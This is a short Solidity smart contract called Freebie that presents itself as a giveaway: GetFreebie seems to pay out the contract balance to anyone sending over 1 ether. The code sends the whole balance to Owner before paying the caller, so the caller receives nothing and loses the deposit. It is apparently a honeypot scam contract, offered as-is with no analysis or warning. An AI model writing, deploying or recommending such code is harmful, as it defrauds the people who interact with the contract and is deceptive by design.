pragma solidity ^0.4.19;

contract Freebie {
    address public Owner;

    function Freebie() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function changeOwner(address newOwner) public {
        require(msg.sender == Owner);
        Owner = newOwner;
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        require(adr.call.value(msg.value)(data));
    }
}